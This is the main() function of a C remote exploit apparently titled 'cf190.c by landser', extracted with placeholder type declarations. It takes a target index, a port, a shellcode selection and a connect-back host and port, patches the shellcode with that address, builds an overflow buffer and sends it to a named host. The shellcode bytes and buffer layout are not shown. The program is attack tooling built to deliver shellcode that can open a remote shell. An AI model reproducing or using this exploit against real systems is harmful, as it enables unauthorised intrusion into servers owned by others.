
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_5__ TYPE_3__ ;
typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_5__ {int code; } ;
struct TYPE_4__ {scalar_t__ len; } ;


 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 int PORT ;
 size_t atoi (int ) ;
 int buf ;
 int close (int ) ;
 int establish (char*,int) ;
 char getopt (int,char**,char*) ;
 size_t n ;
 int optarg ;
 int optind ;
 int perror (char*) ;
 int printf (char*) ;
 int s ;
 int sc ;
 scalar_t__ send (int ,int ,scalar_t__,int ) ;
 TYPE_3__* shellcodes ;
 char* strdup (int ) ;
 size_t structsize (TYPE_1__*) ;
 TYPE_1__* targets ;
 int update (int ,unsigned short,char*) ;
 int usage (char*) ;
 int usleep (int) ;
 int writebuf () ;

int main (int argc, char **argv) {
 int port = 0;
 unsigned short int sc_port = 0;
 char *sc_host = ((void*)0);

 printf("cf190.c by landser - ihsahn at gmail com\n\n");

 char c;
 while ((c = getopt(argc, argv, "t:p:h:d:s:")) != -1) {
  switch (c) {
   case 's': sc = shellcodes[atoi(optarg)].code; break;
   case 'h': sc_host = strdup(optarg); break;
   case 'd': sc_port = atoi(optarg); break;
   case 't': n = atoi(optarg); break;
   case 'p': port = atoi(optarg); break;
   case '?': usage(argv[0]); return EXIT_FAILURE;
  }
 }

 if ((n < 0) || (n >= structsize(targets))) {
  printf("invalid target\n");
  usage(argv[0]);
  return EXIT_FAILURE;
 }

 if ((optind + 1) != argc) {
  printf("no hostname\n");
  usage(argv[0]);
  return EXIT_FAILURE;
 }

 establish(argv[optind], port ? port : PORT);

 update(sc, sc_port, sc_host);

 writebuf();

 printf("> sending\n");

 if (send(s, buf, targets[n].len + 2, 0) < 0) {
  perror("send()");
  return EXIT_FAILURE;
 }
 usleep(100000);

 printf("> done\n");

 close(s);

 return EXIT_SUCCESS;
}
